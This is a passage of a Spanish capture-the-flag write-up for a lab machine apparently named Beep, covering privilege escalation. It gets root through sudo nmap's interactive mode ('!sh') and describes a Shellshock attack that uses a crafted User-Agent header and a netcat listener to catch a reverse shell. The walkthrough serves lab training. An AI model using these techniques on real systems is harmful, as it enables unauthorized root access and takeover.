## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
sudo -l
```

Aqui vemos que tenemos derechos de ejecutar como el usuario root muchos binarios si proporcionar contraseña. Entre ellos

- /bin/chown
- /bin/chmod
- /sbin/service
- /usr/bin/nmap

Aqui tiramos por el binario de nmap

```bash
nmap --version
#Output
4.11

sudo nmap --interactive
!sh
whoami
#Output 
root
```

Ya estamos root y podemos leer las flags.

### Otra forma de rootear la maquina {-}

Tambien podriamos rootear la maquina mediante un shellshock attack.

Si vamos a la url de login del puerto 10000 `https://10.10.10.7:10000/session_login.cgi`, vemos que el fichero es un fichero con extension `.cgi`.
Un shellshock attack pasa por burlar el user-agent de la peticion. Para esto utilizamos Burpsuite.

1. Una vez interceptada la peticion a la url de login.cgi, cambiamos la cabezera del User-Agent de la siguiente forma:

    ```{r, echo = FALSE, fig.cap="Beep shellshock", out.width="90%"}
        knitr::include_graphics("images/Beep-shellshock-reverse-shell.png")
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. En Burpsuite le damos a Forward

Y ganamos accesso al systema como el usuario root ;)

